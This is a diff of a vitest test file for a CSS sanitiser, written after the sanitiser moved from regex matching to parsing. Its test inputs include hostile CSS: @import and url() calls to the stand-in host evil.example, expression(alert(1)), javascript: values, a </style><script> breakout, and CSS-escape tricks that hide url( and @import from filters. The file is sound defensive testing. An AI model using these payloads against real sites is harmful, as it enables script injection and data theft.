@@ -1,53 +1,120 @@
 import { describe, it, expect } from "vitest";
 import {
   sanitizeCss,
-  sanitizeCssValue,
   validateUploadFile,
   isDangerousExtension,
   sanitizeSvg,
-} from "@/lib/security";
+ } from "@/lib/security";
+import { sanitizeCssValue } from "@/lib/css-value";
 
 describe("sanitizeCss", () => {
-  it("strips @import rules, neutralizing the exfiltration target", () => {
+  // These assert what the CSS can no longer do, not how the sanitiser spells
+  // its output: it parses the sheet and writes it back now, so the spacing and
+  // the escapes are the parser's, not a pattern's.
+  it("drops @import, which is the exfiltration target", () => {
     const out = sanitizeCss('@import url("https://evil.example/steal.css");');
     expect(out).not.toContain("evil.example");
-    expect(out).toBe("/* @import removed */");
+    expect(out).not.toMatch(/@import/i);
   });
 
-  it("strips url() calls, neutralizing the exfiltration target", () => {
-    const out = sanitizeCss('.bg { background: url(https://evil.example/x.png); }');
+  it("drops a declaration that fetches from somewhere else", () => {
+    const out = sanitizeCss(".bg { background: url(https://evil.example/x.png); }");
     expect(out).not.toContain("evil.example");
-    expect(out).toBe(".bg { background: /* url() removed */; }");
+    expect(out).not.toMatch(/url\s*\(/i);
   });
 
-  it("strips expression(), neutralizing the script payload", () => {
-    const out = sanitizeCss("width: expression(alert(1));");
-    // expression(...) is replaced wholesale, so the call itself is gone —
-    // only the (now-inert) comment marker remains, no live CSS expression.
-    expect(out).toBe("width: /* expression() removed */);");
+  it("keeps a reference to somewhere in the same document", () => {
+    // `fill: url(#gradient)` fetches nothing. The pattern-matching version
+    // threw it away with the real targets, so an SVG gradient named in custom
+    // CSS never worked.
+    const out = sanitizeCss(".icon { fill: url(#grad); clip-path: url(#c) }");
+    expect(out).toContain("url(#grad)");
+    expect(out).toContain("url(#c)");
   });
 
-  it("strips the javascript: prefix so the value can't be treated as a script URL", () => {
-    const out = sanitizeCss("background: javascript:alert(1);");
-    // The scheme prefix is replaced by a comment marker; without a live
-    // "javascript:" prefix, the trailing "alert(1)" is inert text, not an
-    // executable javascript: URL.
-    expect(out).toBe("background: /* javascript: removed */alert(1);");
+  it("drops expression()", () => {
+    const out = sanitizeCss(".a { width: expression(alert(1)) }");
+    expect(out).not.toMatch(/expression\s*\(/i);
+    expect(out).not.toContain("alert(1)");
   });
 
-  it("strips behavior (IE HTC)", () => {
-    const out = sanitizeCss("behavior: url(evil.htc);");
-    expect(out).not.toMatch(/behavior\s*:/i);
+  it("drops a value that names a script scheme", () => {
+    expect(sanitizeCss(".a { background: none; color: javascript:alert(1) }")).not.toMatch(/javascript\s*:/i);
   });
 
-  it("strips -moz-binding", () => {
-    const out = sanitizeCss("-moz-binding: url(evil.xml#evil);");
-    expect(out).not.toMatch(/-moz-binding\s*:/i);
+  it("drops behavior and -moz-binding", () => {
+    expect(sanitizeCss(".d { behavior: url(evil.htc) }")).not.toMatch(/behavior\s*:/i);
+    expect(sanitizeCss(".e { -moz-binding: url(evil.xml#x) }")).not.toMatch(/-moz-binding/i);
   });
 
-  it("leaves ordinary safe CSS untouched", () => {
+  it("leaves ordinary safe CSS alone", () => {
     const css = ".card { color: #333; font-size: 14px; padding: 1rem; }";
     expect(sanitizeCss(css)).toBe(css);
+  });
+
+  it("leaves the CSS a real site is built out of alone", () => {
+    for (const css of [
+      "@media (min-width: 640px) { .card { display: grid; gap: 1rem } }",
+      "@keyframes spin { from { transform: rotate(0) } to { transform: rotate(360deg) } }",
+      ".hero { background: linear-gradient(90deg, #f00 0%, #00f 100%) }",
+      ":root { --brand: #6366f1 }",
+      ".b { color: var(--brand) }",
+    ]) {
+      expect(sanitizeCss(css)).toBe(css);
+    }
+  });
+
+  it("keeps nothing at all when the sheet cannot be read", () => {
+    const out = sanitizeCss(".broken { color: ");
+    expect(out).not.toContain("broken");
+  });
+
+  describe("the shapes a regular expression could not see", () => {
+    it("cannot be closed out of its own <style> element", () => {
+      // This CSS is written into a <style> element, and the HTML parser ends
+      // that element at the first `</style` it meets, whatever the text means
+      // in CSS. A stylesheet could close its own tag and open a <script> —
+      // live on every published page and inside the editor.
+      for (const css of [
+        ".a { color: red } /* </style><script>alert(1)</script> */",
+        'a[href="</style><script>alert(1)</script>"] { color: red }',
+        '.a { content: "</style><script>alert(1)</script>" }',
+      ]) {
+        expect(sanitizeCss(css)).not.toMatch(/<\/style/i);
+      }
+    });
+
+    it("sees through a CSS escape", () => {
+      // A browser reads every one of these as `url(`, and the pattern that
+      // used to guard this did not.
+      for (const css of [
+        ".a { background: \\75 rl('https://evil.example/?x') }",
+        ".a { background: \\000075rl('https://evil.example/?x') }",
+        ".a { background: u\\72 l('https://evil.example/?x') }",
+        ".a { background: \\u\\72\\6c('https://evil.example/?x') }",
+      ]) {
+        expect(sanitizeCss(css), css).not.toContain("evil.example");
+      }
+      expect(sanitizeCss("@im\\port url('https://evil.example/x.css');")).not.toContain("evil.example");
+    });
+
+    it("reads a bracket inside a string as part of the string", () => {
+      // The pattern stopped at the first ")", which ended the match inside the
+      // quotes and left the rest of the sheet mangled behind it.
+      const out = sanitizeCss('.b { background: url("a)b.png") } .after { color: red }');
+      expect(out).not.toMatch(/url\s*\(/i);
+      expect(out).toContain(".after { color: red }");
+    });
+
+    it("finds a call nested inside another call", () => {
+      expect(sanitizeCss(".h { background: linear-gradient(red, url('https://evil.example/x')) }"))
+        .not.toContain("evil.example");
+    });
+
+    it("drops the other functions that fetch", () => {
+      expect(sanitizeCss(".g { background: image-set('https://evil.example/a.png' 1x) }"))
+        .not.toContain("evil.example");
+    });
   });
 });
 
